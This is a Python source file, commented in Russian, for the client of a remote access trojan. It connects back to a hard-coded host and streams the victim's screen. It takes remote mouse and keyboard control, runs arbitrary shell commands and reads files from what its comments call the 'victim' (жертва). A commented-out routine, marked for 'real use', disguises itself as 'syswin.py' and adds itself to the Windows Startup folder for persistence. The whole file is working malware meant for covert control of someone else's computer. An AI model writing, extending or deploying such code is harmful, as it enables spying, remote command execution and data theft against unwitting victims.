import socket, mss, numpy as np, pickle, struct, threading, os, sys, base64, subprocess
from pynput.mouse import Button, Controller as MouseController
from pynput.keyboard import Controller as KeyboardController

# --- НАСТРОЙКИ ПОДКЛЮЧЕНИЯ ---
HOST = '192.168.0.152'  # Позже заменим на адрес туннеля Playit.gg
PORT = 9999

# --- СЛУЖЕБНАЯ ЧАСТЬ (Маскировка и Автозапуск) ---
# (Для теста мы это закомментируем, чтобы ты видел, как он работает, 
# но для реального использования нужно раскомментировать)

# def add_to_startup():
#     # Добавляет клиент в автозагрузку
#     file_path = os.path.abspath(sys.argv[0])
#     startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'syswin.py')
#     try:
#         with open(startup_path, 'w') as f:
#             f.write(f'import os\nos.system("python {file_path}")')
#     except:
#         pass

# --- ОСНОВНОЙ КОД ---
def recv_cmd(conn):
    # Прием команд с сервера (мышь, клавиатура, консоль)
    while True:
        try:
            header = conn.recv(8)
            if not header: break
            msg_size = struct.unpack("Q", header)[0]
            data = b""
            while len(data) < msg_size:
                data += conn.recv(4 * 1024)
            
            msg = data.decode('utf-8').split("|")
            cmd = msg[0]
            val = msg[1] if len(msg) > 1 else None
            
            mouse = MouseController()
            keyboard = KeyboardController()

            if cmd == "MOVE":
                x, y = map(int, val.split(","))
                mouse.position = (x, y)
            elif cmd == "CLICK":
                if val == "down": mouse.press(Button.left)
                else: mouse.release(Button.left)
            elif cmd == "KEY":
                try: 
                    k = val.replace("Key.", "")
                    keyboard.press(k)
                except: pass
            elif cmd == "CMD":
                # Выполнение консольных команд
                try:
                    result = subprocess.check_output(val, shell=True, stderr=subprocess.STDOUT)
                    response = result.decode('cp866', errors='ignore')
                    # Отправка ответа обратно (пока просто принт, чтобы не усложнять)
                    print(f"CMD Result: {response}")
                except Exception as e:
                    print(f"CMD Error: {e}")
            elif cmd == "DOWNLOAD":
                # Скачивание файла с жертвы
                try:
                    with open(val, "rb") as f:
                        content = base64.b64encode(f.read()).decode('utf-8')
                        print(f"FILE|{val}|{content}")
                except Exception as e:
                    print(f"FILE_ERR|{e}")
                    
        except Exception as e:
            break

def main():
    print("[*] Запуск клиента...")
    # add_to_startup() # Раскомментируй, если хочешь, чтобы клиент сам появлялся в автозагрузке
    
    # Подключение к серверу
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        print(f"[+] Подключено к {HOST}:{PORT}")
    except Exception as e:
        print(f"[-] Ошибка подключения: {e}")
        return

    # Запускаем поток для приема команд
    threading.Thread(target=recv_cmd, args=(client,), daemon=True).start()

    # Захват экрана и отправка
    with mss.mss() as sct:
        monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}
        while True:
            try:
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = frame[:, :, :3] # Убираем альфа-канал
                frame = frame[:, :, ::-1] # BGR to RGB для Pillow
                
                # Сжимаем размер, чтобы не жрало весь интернет
                frame = frame[::2, ::2] 
                
                data = pickle.dumps(frame)
                client.sendall(struct.pack("Q", len(data)) + data)
            except:
                break

if __name__ == '__main__':
    main()
